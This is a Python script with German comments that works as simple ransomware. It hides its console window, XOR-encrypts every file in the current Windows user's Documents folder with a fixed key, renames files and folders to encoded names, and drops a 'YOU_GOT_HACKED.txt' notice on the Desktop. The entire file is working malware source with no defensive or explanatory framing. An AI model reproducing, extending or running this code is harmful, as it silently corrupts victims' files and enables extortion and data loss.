import os
import ctypes
import base64

"""
Dieses Skript verschlüsselt alle Dateien und Ordner im "Documents"-Ordner des aktuellen Benutzers.
Die Verschlüsselung erfolgt mit einer einfachen XOR-Operation, und die Dateinamen werden zusätzlich
in Base64 kodiert, um ungültige Zeichen zu vermeiden.
Am Ende wird eine Datei "YOU_GOT_HACKED.txt" auf dem Desktop erstellt, die eine Liste aller
verschlüsselten Dateien enthält.
Eine Log-Datei mit Debug-Informationen wird im "Downloads"-Ordner gespeichert.
Das Konsolenfenster bleibt während der Ausführung versteckt.
"""

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])


def xor_string(s, key):
    encoded = ''.join(chr(ord(c) ^ key) for c in s)
    safe_encoded = base64.urlsafe_b64encode(encoded.encode()).decode()
    return safe_encoded


def log_message(message, log_path):
    with open(log_path, "a") as log_file:
        log_file.write(message + "\n")


def process_files(folder, key, log_path):
    encrypted_files = []
    for root, dirs, files in os.walk(folder, topdown=False):
        for file in files:
            file_path = os.path.join(root, file)
            encrypted_name = xor_string(file, key)
            encrypted_path = os.path.join(root, encrypted_name)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = xor_encrypt_decrypt(data, key)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
                os.rename(file_path, encrypted_path)
                encrypted_files.append(encrypted_path)
                log_message(f"Datei verschlüsselt: {file_path} -> {encrypted_path}", log_path)
            except PermissionError:
                log_message(f"Berechtigungsfehler: {file_path} - Übersprungen", log_path)
            except Exception as e:
                log_message(f"Fehler beim Verarbeiten von {file_path}: {e}", log_path)

        for dir_name in dirs:
            old_dir_path = os.path.join(root, dir_name)
            encrypted_dir_name = xor_string(dir_name, key)
            encrypted_dir_path = os.path.join(root, encrypted_dir_name)
            try:
                os.rename(old_dir_path, encrypted_dir_path)
                log_message(f"Ordner umbenannt: {old_dir_path} -> {encrypted_dir_path}", log_path)
            except PermissionError:
                log_message(f"Berechtigungsfehler: {old_dir_path} - Übersprungen", log_path)
            except Exception as e:
                log_message(f"Fehler beim Umbenennen von {old_dir_path}: {e}", log_path)
    return encrypted_files


def write_report(encrypted_files, desktop_path, log_path):
    report_path = os.path.join(desktop_path, "YOU_GOT_HACKED.txt")
    with open(report_path, "w") as f:
        f.write("Ihre Dateien wurden verschlüsselt!\n\n")
        f.write("Die folgenden Dateien wurden verändert:\n")
        for file in encrypted_files:
            f.write(file + "\n")
    log_message(f"Bericht erstellt unter: {report_path}", log_path)


def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


def main():
    hide_console()
    documents_folder = os.path.join(os.environ['USERPROFILE'], "Documents")
    desktop_folder = os.path.join(os.environ['USERPROFILE'], "Desktop")
    downloads_folder = os.path.join(os.environ['USERPROFILE'], "Downloads")
    log_path = os.path.join(downloads_folder, "encryption_log.txt")
    key = 0x42  # Einfacher XOR-Key

    log_message("Verschlüsselungsprozess gestartet.", log_path)
    encrypted_files = process_files(documents_folder, key, log_path)
    write_report(encrypted_files, desktop_folder, log_path)
    log_message("Verschlüsselungsprozess abgeschlossen.", log_path)


if __name__ == "__main__":
    main()
